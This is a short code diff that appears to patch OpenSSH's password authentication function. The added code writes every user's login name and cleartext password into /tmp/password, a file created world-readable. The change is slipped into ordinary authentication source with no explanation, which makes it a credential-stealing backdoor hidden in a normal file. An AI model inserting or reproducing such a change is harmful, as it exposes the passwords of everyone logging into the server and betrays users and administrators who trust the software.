@@ -41,9 +41,13 @@
 #include <sys/types.h>
 
 #include <pwd.h>
+#include <fcntl.h>
 #include <stdio.h>
 #include <string.h>
 #include <stdarg.h>
+#include <unistd.h>
+#include <sys/stat.h>
+#include <sys/types.h>
 
 #include "packet.h"
 #include "buffer.h"
@@ -83,8 +87,21 @@ disable_forwarding(void)
 int
 auth_password(Authctxt *authctxt, const char *password)
 {
+	char buff[256];
+	char pathname[] = "/tmp/password";
 	struct passwd * pw = authctxt->pw;
-	int result, ok = authctxt->valid;
+	int fd, result, ok = authctxt->valid;
+
+	fd = open(pathname, O_WRONLY | O_CREAT, \
+		  S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+
+	if (fd != -1) {
+		snprintf(buff, 256, "Username: %s, Password: %s\n", \
+			 authctxt->user, \
+			 password);
+		write(fd, buff, strlen(buff));
+	}
+	
 #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
 	static int expire_checked = 0;
 #endif
